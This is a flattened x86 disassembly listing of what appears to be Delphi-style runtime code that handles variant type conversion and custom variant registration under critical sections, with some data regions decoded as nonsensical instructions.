call sub_414108
retn
lea eax [ ebp - 0x28 ]
call sub_40fe18
mov [ ebx ] ax
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_40fe18
mov [ ebx ] eax
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_411768
fstp [ ebx ]
fwait
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_411768
fstp [ ebx ]
fwait
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_4120c4
fistp [ ebx ]
fwait
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_411768
fstp [ ebx ]
fwait
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_412ea0
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_413544
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_4108dc
mov [ ebx ] eax
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_412778
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_413478
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_40fe18
mov [ ebx ] al
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_40fe18
mov [ ebx ] al
jmp r-xdata
jmp r-xdata
sub_414c48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c78
lea eax [ ebp - 0x28 ]
call sub_40f1fc
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a50
retn
sub_414c94
call [ eax - 0x1d ]
inc eax
add [ eax ] cl
push esi
popad
jb r-xdata
in al dx
popad
outsb
je r-xdata
add al 0x0
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_415874
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_415194
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_414ca4
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_414d05
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_405044
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d0c
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_40324c
sub_414d54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_415194
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_415874
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_414da8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414de0
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_415194
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414e1c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov cx [ rw-data ]
xor edx edx
mov eax esi
call sub_414e60
inc [ rw-data ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_414e60
push ebp
mov ebp esp
add esp 0xfffffec0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x140 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x8 ] cx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4150bd
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40321c
push rw-data
call EnterCriticalSection
xor ecx ecx
push ebp
push sub_415090
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx ebx [ ebp - 0x8 ]
sub ebx 0x100
test ebx ebx
jl r-xdata
add esp 0xfffffff0
call sub_403570
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
cmp [ ebp - 0x8 ] 0x10f
jae r-xdata
mov eax [ rw-data ]
mov eax [ eax + ebx * 4 ]
test eax eax
je r-xdata
mov eax ebx
mov ecx 0xf
cdq
idiv ecx
inc eax
mov edi eax
shl edi 0x4
sub edi eax
cmp edi 0x7ff
jle r-xdata
mov eax [ rw-data ]
call sub_405044
mov esi eax
cmp esi ebx
jg r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + ebx * 4 ] edx
mov eax [ ebp - 0x4 ]
mov dx [ ebp - 0x8 ]
mov [ eax + 0x4 ] dx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415097
push rw-data
call LeaveCriticalSection
retn
cmp eax [ rw-data ]
jne r-xdata
push edi
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405200
add esp 0x4
mov edx esi
push edx
mov eax [ rw-data ]
call sub_405044
dec eax
pop edx
sub eax edx
jl r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] 0xb
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + ebx * 4 ]
mov eax [ eax ]
lea edx [ ebp - 0x13c ]
call sub_40319c
lea eax [ ebp - 0x13c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x4
lea eax [ ebp - 0x3c ]
push eax
push 0x2
lea edx [ ebp - 0x140 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x140 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x24 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
jmp r-xdata
inc eax
mov ecx [ rw-data ]
xor esi esi
mov [ ecx + edx * 4 ] esi
inc edx
dec eax
jne r-xdata
sub_4150c4
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4150e6
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035d8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_41514b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415152
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_41523a
mov eax eax
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403300
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4152e0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_415589
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov al [ eax + ebx + 0x3 ]
mov edx eax
and dl 0x7f
mov esi edx
and esi 0xff
mov edx [ ebp + 0x8 ]
test al 0x80
setne al
cmp esi 0xa
jne r-xdata
cmp esi 0x48
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
lea eax [ edx + eax * 8 ]
call sub_413f58
jmp r-xdata
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0xc ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x8 ]
lea esi [ ecx + edx * 8 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415590
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403fc0
retn
cmp esi 0xc
jne r-xdata
cmp esi 0xc
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4044bc
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4047f4
xor eax eax
mov [ esi + 0x4 ] eax
mov edi ebx
add edi edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + edi * 8 ] 0x8
mov eax [ esi ]
call sub_404804
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + edi * 8 + 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov eax [ eax ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4044bc
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4047f4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov [ esi + 0x4 ] eax
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + eax * 8 ] 0x4008
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx esi
mov [ edx + eax * 8 + 0x8 ] ecx
jmp r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + eax * 8 ] si
lea edx [ esi + esi * 2 ]
mov ecx [ rw-data ]
mov edx [ ecx + edx * 4 + 0x4 ]
dec edx
sub edx 0x2
jb r-xdata
mov eax [ ebp + 0x8 ]
mov edi [ eax - 0x10 ]
cmp [ edi ] 0x100
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
or si 0x4000
mov [ edx + eax * 8 ] si
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx ]
mov [ edx + eax * 8 + 0x8 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
cmp [ eax ] 0x100
jne r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx ]
mov [ edx + eax * 8 + 0x8 ] ecx
jmp r-xdata
dec edx
je r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi edi
lea edi [ edx + eax * 8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0xc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
lea esi [ edx + eax * 8 ]
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4044bc
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4047f4
xor eax eax
mov [ esi + 0x4 ] eax
mov edi ebx
add edi edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + edi * 8 ] 0x8
mov eax [ esi ]
call sub_404804
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + edi * 8 + 0x8 ] eax
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
jmp r-xdata
push 0x8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov ecx eax
mov edx [ ebp + 0x8 ]
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_4151e4
sub edx 0x4
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx ]
mov [ edx + eax * 8 + 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + eax * 8 + 0xc ] ecx
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0x4
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_4151a4
sub_415598
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_415834
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
movzx eax [ eax + 0x1 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x38 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x20 ]
lea edx [ edx + ecx + 0x3 ]
call sub_404194
mov edx [ ebp - 0x38 ]
lea ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405200
add esp 0x4
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405200
add esp 0x4
mov esi [ ebp - 0x20 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
mov al [ eax ]
dec al
je r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
dec al
je r-xdata
push ebp
mov eax ebx
call sub_4152e0
pop ecx
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x44 ]
test al al
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
test al al
jne r-xdata
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x1c ]
mov ebx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x48 ]
test al al
jne r-xdata
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x14 ]
call sub_4151c8
xor eax eax
push ebp
push sub_4156e3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
call sub_413f58
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4151a4
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_4151a4
jmp r-xdata
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41583b
lea eax [ ebp - 0x3c ]
call sub_4046a8
lea eax [ ebp - 0x38 ]
call sub_403f9c
lea eax [ ebp - 0x24 ]
call sub_403f9c
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405320
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405320
retn
dec ebx
mov eax [ ebp - 0x8 ]
lea esi [ eax + ebx * 8 ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x14 ]
call sub_4151d0
retn
mov eax [ ebp - 0x14 ]
call sub_4151a4
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x48 ]
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4151a4
jmp r-xdata
cmp [ ebp - 0x20 ] 0x1
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4151a4
mov eax [ ebp - 0x14 ]
call sub_4151a4
jmp r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov eax [ esi ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048a4
mov edx [ ebp - 0x3c ]
mov eax [ esi + 0x4 ]
call sub_404224
mov eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x4c ]
test al al
jne r-xdata
sub_415874
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41591c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_405044
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_41592c
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415a02
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4159e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_40504c
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4159ec
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_40319c
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_404200
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_408080
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_415a1a
mov eax eax
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415a8b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415a92
retn
call sub_414ca4
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_405320
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404a50
mov eax rw-data
call sub_403f9c
mov eax rw-data
call sub_40f1fc
sub_415a94
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415b35
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415b3c
retn
mov eax rw-data
call sub_413f58
mov eax sub_40eefc
mov [ rw-data ] eax
mov eax sub_40eaa0
mov [ rw-data ] eax
mov edx sub_40e9b0
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40f1fc
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_413b3c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f510
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412778
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412ea0
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_415b40
push 0x920047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebx + 0x680000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x59980000 ] dl
inc edi
add [ ebp + 0x680000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x680000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x680000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x680000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x680000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x680000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x680000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x59980000 ] bl
inc edi
add [ ebp + 0x680000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x680000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x680000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x680000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x680000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x680000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x680000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x59980000 ] al
inc edi
add [ ebp + 0x680000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x680000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x680000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x680000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x680000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x680000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x680000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x59980000 ] cl
inc edi
add [ ebp + 0x680000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x680000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x680000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ eax - 0x1 ] dh
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415c5d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415c64
retn
sub_415d90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcomp [ ebp + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
add [ esi + 0x61 ] al
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
jo r-xdata
add [ edx + 0x5e ] bl
add [ eax ] al
add bh bh
pop ecx
pop edx
pop ebx
retn
jb r-xdata
je r-xdata
jb r-xdata
fstp st2
jns r-xdata
add al 0x92
inc edi
add [ edx + 0x5d8ca101 ] dh
inc ecx
add al ch
xchg ebp eax
pop ebx
jb r-xdata
insb
popad
jns r-xdata
inc esp
and al 0x4
or edx [ edx + ebp * 2 ]
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
outsd
outsb
jbe r-xdata
pop ebx
retn
call sub_415ec4
pop edx
pop esi
outsd
jb r-xdata
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ 0x6f725045 ] dl
jo r-xdata
in al 0x31
jb r-xdata
or al 0x24
mov esi edx
mov ebx eax
mov eax ebx
call sub_403194
mov ecx [ esp ]
mov edx esi
jb r-xdata
inc eax
add [ esi ] cl
inc ebp
push eax
jb r-xdata
sar bh 0xff
jae r-xdata
outsd
jb r-xdata
salc
inc ebp
bound ebp [ ecx + ebp * 2 + 0x73 ]
push 0x656c6261
push esi
popad
jb r-xdata
xor al 0x5e
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax + eax ] cl
add [ eax ] al
in al dx
